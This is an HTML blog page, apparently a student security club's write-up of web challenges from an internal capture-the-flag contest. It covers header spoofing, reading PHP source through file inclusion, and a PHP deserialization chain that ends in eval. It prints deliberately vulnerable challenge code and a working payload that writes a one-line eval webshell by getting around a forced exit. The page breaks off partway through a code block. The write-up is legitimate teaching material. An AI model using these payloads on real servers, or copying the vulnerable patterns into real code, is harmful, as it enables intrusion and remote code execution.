@@ -1,0 +1,710 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-undefined.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"wiki.w-ais.cn","root":"/","scheme":"Gemini","version":"7.7.2","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"./public/search.xml"};
+  </script>
+
+  <meta name="description" content="2019-2020-2-WUST第一次内部赛 Writeup">
+<meta property="og:type" content="article">
+<meta property="og:title" content="WUST内部赛wp">
+<meta property="og:url" content="https://wiki.w-ais.cn/2021/01/30/s1rone_wp/index.html">
+<meta property="og:site_name" content="WUST-AIS">
+<meta property="og:description" content="2019-2020-2-WUST第一次内部赛 Writeup">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://s1.ax1x.com/2020/05/02/JvsEz8.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/05/02/Jvrf2T.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/05/02/Jvr5MF.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/05/02/JvrIr4.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/05/02/JvrhxU.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/05/02/JvrWGV.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/05/02/JvroqJ.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/05/02/Jvr7Z9.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/05/02/JvrHaR.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/05/02/JvrOG6.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/05/02/JvrbI1.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/05/02/JvrLPx.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/05/02/JvrjxO.png">
+<meta property="og:image" content="https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/%E5%8D%8F%E4%BC%9A%E8%AE%AD%E7%BB%83%E8%B5%9B-1-1.png">
+<meta property="og:image" content="https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/%E5%8D%8F%E4%BC%9A%E8%AE%AD%E7%BB%83%E8%B5%9B-1-2.png">
+<meta property="og:image" content="https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/%E5%8D%8F%E4%BC%9A%E8%AE%AD%E7%BB%83%E8%B5%9B-1-3.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/05/02/JvrxMD.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/05/02/JvsSqH.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/05/02/JvsPII.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/05/02/JvsCdA.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/05/02/JvrXRK.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/05/02/JvsARf.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/05/02/JvsZQS.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/05/02/Jvsesg.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/05/02/JvsmLQ.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/05/02/JvsuZj.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/05/02/Jvs9Zd.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/05/02/JvsFit.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/05/02/JvskJP.png">
+<meta property="og:image" content="https://s1.ax1x.com/2020/05/02/Jvrzse.png">
+<meta property="og:image" content="https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/%E5%8D%8F%E4%BC%9A%E8%AE%AD%E7%BB%83%E8%B5%9B-1-4.png">
+<meta property="article:published_time" content="2021-01-30T08:34:15.484Z">
+<meta property="article:modified_time" content="2020-05-02T09:54:53.204Z">
+<meta property="article:author" content="WUST-AIS">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="Web">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s1.ax1x.com/2020/05/02/JvsEz8.png">
+
+<link rel="canonical" href="https://wiki.w-ais.cn/2021/01/30/s1rone_wp/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true
+  };
+</script>
+
+  <title>WUST内部赛wp | WUST-AIS</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">WUST-AIS</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>About</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>Categories</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>Archives</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+
+</nav>
+  <div class="site-search">
+    <div class="popup search-popup">
+    <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocorrect="off" autocapitalize="off"
+           placeholder="Searching..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result"></div>
+
+</div>
+<div class="search-pop-overlay"></div>
+
+  </div>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="en">
+    <link itemprop="mainEntityOfPage" href="https://wiki.w-ais.cn/2021/01/30/s1rone_wp/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/uploads/logo.png">
+      <meta itemprop="name" content="WUST-AIS">
+      <meta itemprop="description" content="Join us">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="WUST-AIS">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          WUST内部赛wp
+        </h1>
+
+        <div class="post-meta">
+           
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2021-01-30 16:34:15" itemprop="dateCreated datePublished" datetime="2021-01-30T16:34:15+08:00">2021-01-30</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2020-05-02 17:54:53" itemprop="dateModified" datetime="2020-05-02T17:54:53+08:00">2020-05-02</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>2019-2020-2-WUST第一次内部赛 Writeup</p>
+<a id="more"></a>
+
+<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="0x00-签到题"><a href="#0x00-签到题" class="headerlink" title="0x00 . 签到题"></a>0x00 . 签到题</h3><p>知识点：</p>
+<p><strong>了解HTTP头部各部分的含义：</strong></p>
+<p><strong>GET传参方式</strong></p>
+<p><strong>POST传参方式</strong></p>
+<p><strong>Referer伪造</strong></p>
+<p><strong>IP伪造（XFF和Client-IP）</strong></p>
+<p>下方是代码逻辑：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&#39;Content-type:text&#x2F;html;charset&#x3D;utf-8&#39;);</span><br><span class="line">if(isset($_GET[&#39;ais&#39;]))&#123;</span><br><span class="line">	if($_GET[&#39;ais&#39;] &#x3D;&#x3D; 123)&#123;</span><br><span class="line">		if(isset($_POST[&#39;ais&#39;]))&#123;</span><br><span class="line">			if ($_POST[&#39;ais&#39;] &#x3D;&#x3D; 123) &#123;</span><br><span class="line">				if(isset($_SERVER[&quot;HTTP_REFERER&quot;]))&#123;</span><br><span class="line">					if($_SERVER[&quot;HTTP_REFERER&quot;]&#x3D;&#x3D;&quot;https:&#x2F;&#x2F;www.baidu.com&quot;)&#123;</span><br><span class="line">						if(isset($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;])||isset($_SERVER[&#39;HTTP_CLIENT_IP&#39;]))&#123;</span><br><span class="line">							if(isset($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;])&amp;&amp;$_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]&#x3D;&#x3D;&quot;127.0.0.1&quot;)&#123;</span><br><span class="line">								die(&quot;你想干嘛！！！从本地访问，你伪造干嘛！！当真我不知道x-forwarded-for嘛！！！&quot;);</span><br><span class="line">							&#125;elseif($_SERVER[&#39;HTTP_CLIENT_IP&#39;]&#x3D;&#x3D;&quot;127.0.0.1&quot;)&#123;</span><br><span class="line">								echo &quot;Oh my god....被你发现了！！&quot;;</span><br><span class="line">								system(&#39;cat &#x2F;flag&#39;);</span><br><span class="line">							&#125;</span><br><span class="line"></span><br><span class="line">						&#125;else&#123;</span><br><span class="line">							die(&quot;你需要从本地来访问我哦！！！&quot;);</span><br><span class="line">						&#125;</span><br><span class="line">					&#125;else&#123;</span><br><span class="line">						die(&quot;很接近了，但你从哪访问的我呀！！只有通过https:&#x2F;&#x2F;www.baidu.com才能访问我呀！！&quot;);</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;else&#123;</span><br><span class="line">					die(&quot;你需要从百度页面来访问我！！！！&quot;);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;else&#123;</span><br><span class="line">				die(&quot;很接近了，很快就能拿到flag了！&quot;);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;else&#123;</span><br><span class="line">			die(&quot;用POST传一个名为ais的参数，令它的值等于123&quot;);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;else&#123;</span><br><span class="line">		die(&quot;很接近了，很快就能拿到flag了！&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">	die(&quot;用GET传一个名为ais的参数，令它的值等于123&quot;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>Burpsuit抓包：发送到Repeater</p>
+<img src="https://s1.ax1x.com/2020/05/02/JvsEz8.png" />
+
+<p>更换请求方式：</p>
+<p>1、GET方式传参</p>
+<img src="https://s1.ax1x.com/2020/05/02/Jvrf2T.png" />
+
+<p>2、POST方式传参</p>
+<img src="https://s1.ax1x.com/2020/05/02/Jvr5MF.png"/>
+
+<p>3、伪造Referer和IP</p>
+<img src="https://s1.ax1x.com/2020/05/02/JvrIr4.png" />
+
+<p>（这里ban掉了XFF）</p>
+<h3 id="0x01-PHP是世界上最好的语言"><a href="#0x01-PHP是世界上最好的语言" class="headerlink" title="0x01 . PHP是世界上最好的语言"></a>0x01 . PHP是世界上最好的语言</h3><p>知识点：</p>
+<p><strong>服务器解析页面顺序</strong></p>
+<p><strong>文件包含（php伪协议读取源码）</strong></p>
+<p><strong>学习一下一句话木马及其原理</strong></p>
+<p><strong>简单的代码审计（传马绕过死亡exit）</strong></p>
+<p>apache下的配置文件httpd.conf，一般默认的是html，然后php</p>
+<p><img src="https://s1.ax1x.com/2020/05/02/JvrhxU.png" alt="JvrhxU.png"></p>
+<p>根目录放了两个文件<img src="https://s1.ax1x.com/2020/05/02/JvrWGV.png" alt="JvrWGV.png"></p>
+<p>所有会先是先是index.html</p>
+<p>所以这里直接访问index.php</p>
+<p>在index.php里面放了两个提示：（随便一个都可以往下走）</p>
+<p>1、F12审计，有个URL:?file= </p>
+<p>2、抓包，在HTTP响应头部有个hint，base64解码得到：file include: /?file</p>
+<p>所以，这里考察的是文件包含（页面使用的是PHP语言）</p>
+<p>用到PHP伪协议读取源码：</p>
+<p><a href="https://imgchr.com/i/JvroqJ" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/05/02/JvroqJ.png" alt="JvroqJ.png"></a></p>
+<p>得到index.php经过base64后的源代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html; charset&#x3D;utf-8&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;å¦å¦å¦ï¼ä½ å¨è¿&lt;&#x2F;title&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">	div&#123;</span><br><span class="line">		float: left;</span><br><span class="line">	&#125;</span><br><span class="line">&lt;&#x2F;style&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;!--</span><br><span class="line"></span><br><span class="line">	URL:&#x2F;?file&#x3D;</span><br><span class="line"></span><br><span class="line">--&gt;</span><br><span class="line"></span><br><span class="line">&lt;div id&#x3D;&#39;left&#39;&gt;&lt;img src&#x3D;&quot;bg.jpg&quot; height&#x3D;&quot;70%&quot; width&#x3D;&quot;70%&quot;&gt;&lt;&#x2F;div&gt;</span><br><span class="line">&lt;div id&#x3D;&#39;right&#39;&gt;</span><br><span class="line">	&lt;h1&gt;&lt;&#x2F;h1&gt;</span><br><span class="line">	&lt;h2&gt;&lt;&#x2F;h2&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br><span class="line">&lt;?php &#x2F;&#x2F;look:  upload.php</span><br><span class="line">	header(&#39;hint: ZmlsZSBpbmNsdWRlOiAvP2ZpbGU&#x3D;&#39;);</span><br><span class="line">    $file &#x3D; @$_GET[&#39;file&#39;];</span><br><span class="line">    if(isset($file))&#123;</span><br><span class="line">    include($file);</span><br><span class="line">     &#125;</span><br><span class="line">     ?&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>有个upload.php,通过同样的方法读取源码</p>
+<p><a href="https://imgchr.com/i/Jvr7Z9" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/05/02/Jvr7Z9.png" alt="Jvr7Z9.png"></a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$exit&#x3D;&quot;&lt;?php exit; &#x2F;&#x2F;I just want you to understand the principle ?&gt;&quot;;</span><br><span class="line">@$exit.&#x3D;$_POST[&#39;death&#39;];</span><br><span class="line"></span><br><span class="line">@$filename &#x3D; $_POST[&#39;filename&#39;];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if(!isset($filename))&#123;</span><br><span class="line">   @file_put_contents($filename, &quot;you should set something&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">else&#123;</span><br><span class="line">   @file_put_contents($filename,$exit);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这里是一个简单的代码审计：</p>
+<p>可以上传任意文件，并且可以往文件里面写任何东西，但存在一个限制（在每个文件头都加上了exit），这导致传入的可执行马不能运行，所以这里要绕过exit，让它不生效</p>
+<p>（这里还是使用PHP伪协议，向文件写入代码）</p>
+<p>可以参考一下P牛的这篇文章：（了解一下base64的原理）</p>
+<p><a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/php-filter-magic.html</a></p>
+<p>由于前面用了//注释了一些东西，要base64正确解码，就必须在payload前面多给3个字符，让他与前面的字符串组成的长度是4的倍数，然后后面传payload</p>
+<p>payload:</p>
+<p>death=aaaPD9waHAKZXZhbCgkX1BPU1RbJ3NoZWxsJ10pOwo/Pg==&amp;filename=php://filter/write=convert.base64-decode/resource=xxxxxx.php</p>
+<p>这样传入的一句话木马就可以生效了，用蚁剑连上去，在服务器根目录发现flag</p>
+<p><img src="https://s1.ax1x.com/2020/05/02/JvrHaR.png" alt="JvrHaR.png"></p>
+<h3 id="0x02-你喜欢甜饼吗"><a href="#0x02-你喜欢甜饼吗" class="headerlink" title="0x02 . 你喜欢甜饼吗"></a>0x02 . 你喜欢甜饼吗</h3><p>知识点：</p>
+<p><strong>逻辑漏洞（薅羊毛）</strong></p>
+<p><strong>反序列化（魔术方法的利用）</strong></p>
+<p>1、通过伪造Cookie拿到hint</p>
+<p>抓包查看cookie，有个tag参数，base64解码一下：</p>
+<p><a href="https://imgchr.com/i/JvrOG6" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/05/02/JvrOG6.png" alt="JvrOG6.png"></a></p>
+<p>得到：user:guest,permission:false</p>
+<p>页面提示是要admin才能访问，将guest改为admin，base64后传进去，发现页面提示没有权限，所以这里再改一下permission，改为true</p>
+<p>user:admin,permission:true</p>
+<p>base64一下覆盖tag后面的一串，拿到hint</p>
+<p><a href="https://imgchr.com/i/JvrbI1" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/05/02/JvrbI1.png" alt="JvrbI1.png"></a></p>
+<p>访问这个网站：然后F12看到这个提示：</p>
+<p><img src="https://s1.ax1x.com/2020/05/02/JvrLPx.png" alt="JvrLPx.png"></p>
+<p>直接访问这个zip，下载得到源码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&#x2F;*</span><br><span class="line">你居然找到了源码</span><br><span class="line"></span><br><span class="line">惊不惊喜，意不意外</span><br><span class="line"></span><br><span class="line">hint: flag在&#x2F;flag</span><br><span class="line"></span><br><span class="line">留下你的姓名。。。。。。。。。。。。。。。。。。。。。。。。。。。。。</span><br><span class="line">*&#x2F;</span><br><span class="line">header(&quot;Content-Type: text&#x2F;html; charset&#x3D;utf-8&quot;);</span><br><span class="line"></span><br><span class="line">class Sea&#123;</span><br><span class="line">   public $d0y0uw4nt;</span><br><span class="line"></span><br><span class="line">   function waoooo()&#123;</span><br><span class="line">         echo &quot;&lt;h1&gt;你是否有过黑客梦！！！！！！！！&lt;&#x2F;h1&gt;&lt;br&#x2F;&gt;&quot;;</span><br><span class="line">         echo $this;</span><br><span class="line">         echo $this-&gt;d0y0uw4nt;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   function __construct($shell)&#123;</span><br><span class="line">         $this-&gt;d0y0uw4nt &#x3D; $shell;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   public function __toString()&#123;</span><br><span class="line">         unserialize($this-&gt;d0y0uw4nt);</span><br><span class="line">         return &quot;&lt;h2&gt;自闭的一天就要来了！！！！&lt;&#x2F;h2&gt;&quot;;</span><br><span class="line"></span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Cry&#123;</span><br><span class="line">        public $C;</span><br><span class="line"></span><br><span class="line">        public $fl4g;</span><br><span class="line"></span><br><span class="line">        public function halo()&#123;</span><br><span class="line">                echo &quot;这么多代码，是不是不想看！！！！！！！！&quot;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public function y0u_hacker()&#123;</span><br><span class="line">                &#x2F;&#x2F;echo $this-&gt;fl4g;</span><br><span class="line">                eval($this-&gt;fl4g);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        function __destruct()&#123;</span><br><span class="line">                &#x2F;&#x2F;echo &quot;Cry类死了！&quot;;</span><br><span class="line">                $this-&gt;C-&gt;s4y_l0v3();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">class Love&#123;</span><br><span class="line">        public $B;</span><br><span class="line"></span><br><span class="line">        public function sea_said()&#123;</span><br><span class="line">                echo &quot;愿你一生努力，一生被爱！！&quot;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public function y0u_love()&#123;</span><br><span class="line">                echo &quot;想要的都拥有，得不到的都释怀！！&quot;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F;s4y_l0v3明天再写</span><br><span class="line"></span><br><span class="line">        function __call($method,$value)&#123; &#x2F;&#x2F;最终的利用方式</span><br><span class="line">                $this-&gt;B-&gt;y0u_hacker();</span><br><span class="line">        &#125;</span><br><span class="line">        function __destruct()&#123;</span><br><span class="line">                &#x2F;&#x2F;echo &quot;Love类死了！&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@$wuhaha &#x3D; $_POST[&#39;l0v3&#39;];</span><br><span class="line">$Sea &#x3D; new Sea($wuhaha);</span><br><span class="line">$Sea-&gt;waoooo();</span><br></pre></td></tr></table></figure>
+
+<p>这里考察了一下反序列化和魔术方法的利用：（简单POP链的构造）</p>
+<p>找到Cry类中的y0u_hacker方法（因为存在eval函数），所以就从这里入手，看看能不能调用这个函数，并且fl4g参数可控；（大多安全问题都来源于输入与输出）</p>
+<p>这里审计一下代码，发现Love类中的__call方法调用了y0u_hacker函数，那么就要想办法调用这个函数（关于__call方法，当该对象调用的方法不存在的时候，就调用这个方法）</p>
+<p>所以这里找到Cry的__destruct析构函数，如果这里将C变为Love对象，那么就会调用Love对象的__call方法（因为Love对象没有s4y_l0v3这个函数）</p>
+<p>那么到此，利用链就清楚了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span 